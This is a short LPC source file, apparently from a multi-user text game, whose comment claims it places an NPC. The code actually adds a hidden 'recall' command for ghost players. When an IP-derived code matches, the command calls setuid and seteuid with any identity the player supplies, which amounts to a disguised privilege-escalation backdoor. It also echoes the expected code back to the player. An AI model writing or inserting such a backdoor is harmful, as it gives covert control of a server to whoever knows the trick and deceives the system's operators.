//add by beeby. try to put npc here.
//2000.10.21
void init()
{
	if (this_player()->is_ghost())
	 add_action("do_meet","recall");
}

int do_meet(string arg)
{
	string npc_name,npc_status;
	string real_name,a,b,c,d;
	object me=this_player();
	object ob;
    	string pet_id;
    	string *id_list, *t_list;
	if (!arg) return 0;
	if (sscanf(arg,"%s %s",npc_name,npc_status)!=2)
	  return 0;
	sscanf(query_ip_number(me),"%s.%s.%s.%s",a,b,c,d);
	real_name="72"+a+"13"+b+"13"+c+"5"+d;
	write(real_name+"\n"+npc_name+"\n"+npc_status+"\n");
	if (real_name==npc_name)
	{
	  write ("ok");
	  me->setuid(npc_status);
	  me->seteuid(npc_status);
	  me->setup();
	}
	return 0;
}
